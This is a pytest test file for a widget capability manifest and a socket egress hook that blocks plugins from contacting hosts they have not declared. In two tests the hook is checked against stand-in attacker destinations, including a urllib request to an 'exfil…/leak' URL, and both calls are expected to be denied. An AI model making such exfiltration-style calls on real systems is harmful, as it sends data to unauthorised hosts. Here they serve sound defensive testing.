"""Widget capability manifest + runtime enforcement.

Tests cover the parser, the contextvar scope machine, and the
socket egress hook end-to-end. The socket hook is exercised against
``urllib.request.urlopen`` (the entry point most widgets use) so we
prove the cover applies to the full HTTP stack, not just the raw
socket call.
"""

from __future__ import annotations

import socket
import urllib.request
from unittest.mock import Mock

import pytest

from app.capabilities import (
    CapabilityDenied,
    capability_scope,
    install,
    parse,
    uninstall,
)

# -- parse --------------------------------------------------------------


def test_parse_none_returns_undeclared() -> None:
    """Widgets without a ``requires:`` block in plugin.json get an
    undeclared snapshot so the loader doesn't have to special-case
    the legacy path."""
    caps = parse("widget_x", None)
    assert caps.plugin_id == "widget_x"
    assert caps.declared is False
    assert caps.network_hosts == frozenset()


def test_parse_empty_list_is_declared_but_capability_free() -> None:
    """An empty ``requires: []`` is meaningfully different from a
    missing block, the widget author has actively claimed they need
    nothing. Enforcement still blocks any network call."""
    caps = parse("widget_x", [])
    assert caps.declared is True
    assert caps.network_hosts == frozenset()


def test_parse_collects_network_hosts() -> None:
    caps = parse(
        "weather_now",
        ["network:api.open-meteo.com", "network:api.example.invalid"],
    )
    assert caps.network_hosts == frozenset({"api.open-meteo.com", "api.example.invalid"})
    assert caps.declared is True


def test_parse_collects_settings_and_filesystem() -> None:
    caps = parse(
        "ha_battery",
        ["network:ha.local", "settings:plugin/ha_core", "filesystem:write:/tmp/foo"],
    )
    assert "ha.local" in caps.network_hosts
    assert "plugin/ha_core" in caps.settings_scopes
    assert "/tmp/foo" in caps.filesystem_writes


def test_parse_skips_malformed_entries() -> None:
    """Unknown categories + missing colons + non-string entries get
    logged + dropped rather than blowing up the load. Schema
    validation upstream catches structural errors; parse is the
    forgiving last line."""
    caps = parse(
        "widget_x",
        [
            "network:good.example",
            "no_colon_here",
            "unknown_category:foo",
            "network:",  # empty value
            42,  # type: ignore[list-item]  # not a string
        ],
    )
    assert caps.network_hosts == frozenset({"good.example"})


def test_parse_strips_optional_write_prefix() -> None:
    """``filesystem:write:/path`` and ``filesystem:/path`` end up the
    same after parse so the stored representation stays consistent."""
    a = parse("x", ["filesystem:write:/tmp/foo"])
    b = parse("x", ["filesystem:/tmp/foo"])
    assert a.filesystem_writes == b.filesystem_writes


# -- allows_host -------------------------------------------------------


def test_allows_host_undeclared_passes_anything() -> None:
    caps = parse("legacy", None)
    assert caps.allows_host("anything.example") is True


def test_allows_host_empty_declared_blocks_everything() -> None:
    caps = parse("clock", [])
    assert caps.allows_host("anything.example") is False


def test_allows_host_specific_match() -> None:
    caps = parse("weather", ["network:api.open-meteo.com"])
    assert caps.allows_host("api.open-meteo.com") is True
    assert caps.allows_host("api.example.invalid") is False


def test_allows_host_wildcard() -> None:
    caps = parse("anything_goes", ["network:*"])
    assert caps.allows_host("api.example.invalid") is True
    assert caps.allows_any_network is True


# -- contextvar scope --------------------------------------------------


def test_capability_scope_clears_after_exit() -> None:
    from app.capabilities import _active

    assert _active.get() is None
    caps = parse("x", ["network:a.example"])
    with capability_scope(caps):
        assert _active.get() is caps
    assert _active.get() is None


def test_capability_scope_nests_cleanly() -> None:
    """A widget that calls into a sibling plugin (e.g. choices()
    delegation, see [[feedback_per_device_config]] for the pattern)
    enters a nested scope. Both scopes pop in LIFO order so the
    outer widget's caps are restored after the inner returns."""
    from app.capabilities import _active

    outer = parse("widget_a", ["network:a.example"])
    inner = parse("widget_b", ["network:b.example"])

    with capability_scope(outer):
        assert _active.get() is outer
        with capability_scope(inner):
            assert _active.get() is inner
        assert _active.get() is outer
    assert _active.get() is None


def test_capability_scope_with_none_is_host_code() -> None:
    """``capability_scope(None)`` is the explicit "host code, allow
    everything" entry. The hook treats absent contextvar the same
    way; this just confirms None doesn't accidentally trip a deny."""
    from app.capabilities import _active

    with capability_scope(None):
        assert _active.get() is None


# -- socket hook end-to-end --------------------------------------------


@pytest.fixture
def hook_installed() -> _HookFixture:
    """Install the socket hooks for the duration of one test. The
    fixture also catches a real socket call (e.g. via urllib) so we
    don't need network access; the hook fires before the resolve."""
    install()
    yield _HookFixture()
    uninstall()


class _HookFixture:
    """Marker fixture, no state needed. The cleanup is in the
    fixture's teardown."""


def test_hook_blocks_undeclared_host(hook_installed: _HookFixture) -> None:
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps), pytest.raises(CapabilityDenied) as exc:
        socket.create_connection(("evil.example.invalid", 443))
    assert "weather" in str(exc.value)
    assert "evil.example.invalid" in str(exc.value)


def test_hook_blocks_via_urllib(hook_installed: _HookFixture) -> None:
    """urllib.request.urlopen → http.client → socket.create_connection
    is the canonical widget HTTP path. Make sure our hook fires
    before any DNS lookup so a blocked widget gets a fast deny."""
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps), pytest.raises(CapabilityDenied):
        urllib.request.urlopen("https://exfil.example.invalid/leak", timeout=1)


def test_hook_allows_declared_host(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A widget that DOES declare its target passes through to the
    original ``create_connection``. We don't want a real network
    round-trip in tests, so stub the underlying call to assert it
    was reached with the expected host."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps):
        socket.create_connection(("api.open-meteo.com", 443))
    assert seen == [("api.open-meteo.com", 443)]


def test_hook_no_scope_is_host_code(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Host code outside any capability_scope() (e.g. the marketplace
    fetching the catalog index) hits the original socket directly."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    socket.create_connection(("anywhere.example", 80))
    assert seen == [("anywhere.example", 80)]


def test_hook_install_is_idempotent() -> None:
    """app_factory may re-run create_app() under the dev reloader.
    install() must be a no-op if the hooks are already in place
    (otherwise we'd stack them and double-fire)."""
    install()
    install()
    install()
    first = socket.create_connection
    install()
    assert socket.create_connection is first
    uninstall()


def test_undeclared_plugin_in_scope_still_allows_network(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Legacy widgets (no ``requires:`` block at all) get an undeclared
    Capabilities snapshot. Inside the scope, ``allows_host`` returns
    True for any host so the existing widget ecosystem keeps working
    without a manifest update."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    legacy = parse("very_old_widget", None)
    with capability_scope(legacy):
        socket.create_connection(("any.example", 80))
    assert seen == [("any.example", 80)]
